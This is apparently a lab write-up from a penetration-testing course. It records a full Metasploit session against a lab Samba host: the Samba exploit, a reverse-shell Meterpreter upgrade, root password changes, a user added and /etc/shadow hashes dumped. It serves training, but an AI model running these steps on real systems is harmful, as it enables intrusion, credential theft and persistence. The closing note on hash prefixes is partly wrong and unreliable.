In this lab, the target machine is running a vulnerable file sharing service. Exploit it and run the following post modules on the target:

- post/multi/gather/ssh_creds
- post/multi/gather/docker_creds
- post/linux/gather/hashdump
- post/linux/gather/ecryptfs_creds
- post/linux/gather/enum_psk
- post/linux/gather/enum_xchat
- post/linux/gather/phpmyadmin_credsteal
- post/linux/gather/pptpd_chap_secrets
- post/linux/manage/sshkey_persistence

---

- We can dump Linux user hashes with the hashdump post exploitation module.
- Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.
- The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with John the Ripper.

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.10  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0a  txqueuelen 0  (Ethernet)
        RX packets 113  bytes 10251 (10.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 92  bytes 312510 (305.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.57.137.2  netmask 255.255.255.0  broadcast 192.57.137.255
        ether 02:42:c0:39:89:02  txqueuelen 0  (Ethernet)
        RX packets 15  bytes 1306 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~# service postgresql start && msfconsole
[ ok ] Starting PostgreSQL 11 database server: main.
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a Hashdump
[*] Added workspace: Hashdump
[*] Workspace: Hashdump
msf5 > setg rhosts 192.57.137.3
rhosts => 192.57.137.3
msf5 > db_nmap -sV 192.57.137.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-08 17:03 UTC
[*] Nmap: Nmap scan report for target-1 (192.57.137.3)
[*] Nmap: Host is up (0.0000090s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:39:89:03 (Unknown)
[*] Nmap: Service Info: Host: VICTIM-1
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds
msf5 > search type:exploit name:samba

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   1   exploit/freebsd/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   2   exploit/linux/samba/chain_reply              2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   3   exploit/linux/samba/is_known_pipename        2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   4   exploit/linux/samba/lsa_transnames_heap      2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   5   exploit/linux/samba/setinfopolicy_heap       2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   6   exploit/linux/samba/trans2open               2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   7   exploit/multi/samba/nttrans                  2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   8   exploit/multi/samba/usermap_script           2007-05-14       excellent  No     Samba "username map script" Command Execution
   9   exploit/osx/samba/lsa_transnames_heap        2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   10  exploit/osx/samba/trans2open                 2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   11  exploit/solaris/samba/lsa_transnames_heap    2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   12  exploit/solaris/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   13  exploit/windows/http/sambar6_search_results  2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow


msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.57.137.3     yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > run

[*] 192.57.137.3:445 - Using location \\192.57.137.3\exploitable\tmp for the path
[*] 192.57.137.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.57.137.3:445 - Share 'exploitable' has server-side path '/
[*] 192.57.137.3:445 - Uploaded payload to \\192.57.137.3\exploitable\tmp\BTkroQXq.so
[*] 192.57.137.3:445 - Loading the payload from server-side path /tmp/BTkroQXq.so using \\PIPE\/tmp/BTkroQXq.so...
[-] 192.57.137.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.57.137.3:445 - Loading the payload from server-side path /tmp/BTkroQXq.so using /tmp/BTkroQXq.so...
[+] 192.57.137.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.57.137.2:42697 -> 192.57.137.3:445) at 2023-08-08 17:04:51 +0000

pwd
/tmp
^Z
Background session 1? [y/N]  y
msf5 exploit(linux/samba/is_known_pipename) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.57.137.2:4433 
[*] Sending stage (985320 bytes) to 192.57.137.3
[*] Meterpreter session 2 opened (192.57.137.2:4433 -> 192.57.137.3:43882) at 2023-08-08 17:05:11 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                  Connection
  --  ----  ----                   -----------                                  ----------
  1         shell cmd/unix                                                      192.57.137.2:42697 -> 192.57.137.3:445 (192.57.137.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.57.137.3  192.57.137.2:4433 -> 192.57.137.3:43882 (192.57.137.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions 2
[*] Starting interaction with 2...

meterpreter > ls
No entries exist in /tmp
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > sysinfo
Computer     : 192.57.137.3
OS           : Debian 8.11 (Linux 5.4.0-153-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > ps aux
Filtering on 'aux'
No matching processes were found.
meterpreter > hashdump
[-] Unknown command: hashdump.
meterpreter > 
Background session 2? [y/N]  y
[-] Unknown command: y.
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                  Connection
  --  ----  ----                   -----------                                  ----------
  1         shell cmd/unix                                                      192.57.137.2:42697 -> 192.57.137.3:445 (192.57.137.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.57.137.3  192.57.137.2:4433 -> 192.57.137.3:43882 (192.57.137.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions 2
[*] Starting interaction with 2...

meterpreter > bg
[*] Backgrounding session 2...
msf5 exploit(linux/samba/is_known_pipename) > search hashdump

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   1   auxiliary/analyze/jtr_mssql_fast                                       normal  No     John the Ripper MS SQL Password Cracker (Fast Mode)
   2   auxiliary/analyze/jtr_mysql_fast                                       normal  No     John the Ripper MySQL Password Cracker (Fast Mode)
   3   auxiliary/analyze/jtr_oracle_fast                                      normal  No     John the Ripper Oracle Password Cracker (Fast Mode)
   4   auxiliary/analyze/jtr_postgres_fast                                    normal  No     John the Ripper Postgres SQL Password Cracker
   5   auxiliary/analyze/jtr_windows_fast                                     normal  No     John the Ripper Windows Password Cracker (Fast Mode)
   6   auxiliary/scanner/mssql/mssql_hashdump                                 normal  Yes    MSSQL Password Hashdump
   7   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  Yes    MySQL Authentication Bypass Password Dump
   8   auxiliary/scanner/mysql/mysql_hashdump                                 normal  Yes    MYSQL Password Hashdump
   9   auxiliary/scanner/oracle/oracle_hashdump                               normal  Yes    Oracle Password Hashdump
   10  auxiliary/scanner/postgres/postgres_hashdump                           normal  Yes    Postgres Password Hashdump
   11  auxiliary/scanner/smb/impacket/secretsdump                             normal  Yes    DCOM Exec
   12  post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   13  post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   14  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   15  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   16  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   17  post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   18  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   19  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   20  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


msf5 exploit(linux/samba/is_known_pipename) > use post/linux/gather/hashdump
msf5 post(linux/gather/hashdump) > info

       Name: Linux Gather Dump Password Hashes for Linux Systems
     Module: post/linux/gather/hashdump
   Platform: Linux
       Arch: 
       Rank: Normal

Provided by:
  Carlos Perez <carlos_perez@darkoperator.com>

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on.

Description:
  Post Module to dump the password hashes for all users on a Linux 
  System

msf5 post(linux/gather/hashdump) > options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > set session 2
session => 2
msf5 post(linux/gather/hashdump) > run

[+] Unshadowed Password File: /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.hashes_630396.txt
[*] Post module execution completed
msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.hashes_630396.txt
[*] exec: cat /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.hashes_630396.txt

msf5 post(linux/gather/hashdump) > loot

Loot
====

host          service  type          name                   content     info                            path
----          -------  ----          ----                   -------     ----                            ----
192.57.137.3           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.shadow_607608.txt
192.57.137.3           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.passwd_074961.txt
192.57.137.3           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.hashes_630396.txt

msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.passwd_074961.txt
[*] exec: cat /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.passwd_074961.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false
colord:x:105:112:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:106:113::/var/lib/saned:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.hashes_630396.txt
[*] exec: cat /root/.msf4/loot/20230808170733_Hashdump_192.57.137.3_linux.hashes_630396.txt

msf5 post(linux/gather/hashdump) > sessions 2
[*] Starting interaction with 2...

meterpreter > shell
Process 41 created.
Channel 5 created.
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/tmp# passwd root
passwd root
Enter new UNIX password: password123
Retype new UNIX password: password123
passwd: password updated successfully
root@victim-1:/tmp# useradd -m murari -s /bin/bash
useradd -m murari -s /bin/bash
root@victim-1:/tmp# passwd murari
passwd murari
Enter new UNIX password: password321
Retype new UNIX password: password321
passwd: password updated successfully
root@victim-1:/tmp# ^C
Terminate channel 5? [y/N]  y
meterpreter > 
[*] 192.57.137.3 - Meterpreter session 2 closed.  Reason: Died

msf5 post(linux/gather/hashdump) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.57.137.2:4433 
[*] Sending stage (985320 bytes) to 192.57.137.3
[*] Meterpreter session 3 opened (192.57.137.2:4433 -> 192.57.137.3:34516) at 2023-08-08 17:10:44 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 post(linux/gather/hashdump) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell cmd/unix                      192.57.137.2:42697 -> 192.57.137.3:445 (192.57.137.3)
  3         meterpreter x86/linux               192.57.137.2:4433 -> 192.57.137.3:34516 (192.57.137.3)

msf5 post(linux/gather/hashdump) > options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > set session 
[*] Stopping exploit/multi/handler

session => 2
msf5 post(linux/gather/hashdump) > set session 3
session => 3
msf5 post(linux/gather/hashdump) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                  Connection
  --  ----  ----                   -----------                                  ----------
  1         shell cmd/unix                                                      192.57.137.2:42697 -> 192.57.137.3:445 (192.57.137.3)
  3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.57.137.3  192.57.137.2:4433 -> 192.57.137.3:34516 (192.57.137.3)

msf5 post(linux/gather/hashdump) > run

[+] root:$6$q12ym2pp$xtc7FKvH.m/Orb1t2az7Pyi6f7lbVrrloBABYtzVGHSNVKn/CLtdc6dhAi1xLoBxx8kyauFmSamRc9QHreOtb1:0:0:root:/root:/bin/bash
[+] murari:$6$NQw.ompG$yL5k38gAB0HYM.2MvLUxSB24RaUrafApjD2GB1fTTgWxLtITZRGxFlRtMCheoqlwUNA.Iv6nitABjEZ/DpiD41:1000:1000::/home/murari:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20230808171112_Hashdump_192.57.137.3_linux.hashes_587291.txt
[*] Post module execution completed
msf5 post(linux/gather/hashdump) >
```

The $ 6 $ in the shadow refers to the hashing algo use or hashing algo. higher the num the stronger encryption. In older versions of system it is 
1 meaning MD5 hashing is used.
2 - Blue fish
3 or 5 - sha256 algo
6 - sha512

